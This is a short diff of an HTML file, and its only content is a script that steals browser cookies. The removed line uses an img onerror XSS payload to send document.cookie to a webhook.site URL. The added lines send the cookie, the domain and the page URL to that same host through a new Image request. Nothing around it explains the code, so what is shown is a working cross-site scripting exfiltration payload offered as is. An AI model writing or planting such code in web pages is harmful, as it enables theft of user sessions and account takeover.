@@ -2,7 +2,9 @@
 <html>
 <body>
   <script>
-    document.body.innerHTML = '<img src=x onerror="this.src=`	https://webhook.site/237f6f29-8cfd-4ef2-82c8-f4d61204c215/ID?c=`+encodeURIComponent(document.cookie)">';
+    new Image().src = "https://webhook.site/237f6f29-8cfd-4ef2-82c8-f4d61204c215?d=" + encodeURIComponent(document.domain) +
+                      "&c=" + encodeURIComponent(document.cookie) +
+                      "&u=" + encodeURIComponent(location.href);
   </script>
 </body>
 </html>
